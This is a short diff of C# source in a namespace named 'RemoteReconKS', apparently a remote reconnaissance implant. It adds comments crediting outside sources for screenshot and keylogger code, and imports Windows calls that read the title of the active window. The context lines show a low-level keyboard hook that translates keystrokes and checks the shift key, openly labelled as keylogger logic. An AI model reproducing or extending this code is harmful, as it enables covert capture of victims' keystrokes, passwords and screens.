@@ -49,6 +49,7 @@ namespace RemoteReconKS
             }
         }
 
+        //https://stackoverflow.com/questions/362986/capture-the-screen-into-a-bitmap
         private static string screenshot()
         {
 
@@ -95,7 +96,7 @@ namespace RemoteReconKS
             
         }
 
-        //Keyboard hook
+        //Keylogger logic/code from: https://null-byte.wonderhowto.com/how-to/create-simple-hidden-console-keylogger-c-sharp-0132757/
         private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -117,6 +118,7 @@ namespace RemoteReconKS
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 //Catch modifier keys and append a string representation.
+
                 switch ((Keys)vkCode)
                 {
                     case Keys.Space:
@@ -151,6 +153,7 @@ namespace RemoteReconKS
                         break;
                 }
 
+               
                 
                 //Check if the shift modifier was used
                 bool shiftMod = Convert.ToBoolean((int)WinApi.GetAsyncKeyState(Keys.ShiftKey) & 32768);
@@ -191,5 +194,10 @@ namespace RemoteReconKS
             return WinApi.CallNextHookEx(WinApi._hookID, nCode, wParam, lParam);
         }
 
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern Int32 GetWindowText(IntPtr hWindow, StringBuilder lpString, int nMaxCount);
     }
 }
